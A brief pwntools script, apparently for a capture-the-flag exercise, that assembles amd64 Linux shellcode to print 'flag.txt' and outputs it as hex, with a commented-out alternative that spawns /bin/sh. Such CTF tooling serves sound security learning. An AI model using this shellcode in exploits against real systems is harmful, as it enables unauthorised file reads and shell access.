#!/bin/python3

from pwn import *

context(os="linux", arch="amd64", log_level="error")

# syscall and args
# syscall = shellcraft.execve(path='/bin/sh',argv=['/bin/sh']) 
syscall = pwnlib.shellcraft.amd64.linux.cat('flag.txt')

# Generate shellcode
sc = asm(syscall).hex() 
print(f'Shellcode contains N bytes: {len(sc) // 2}\n')
print(sc)
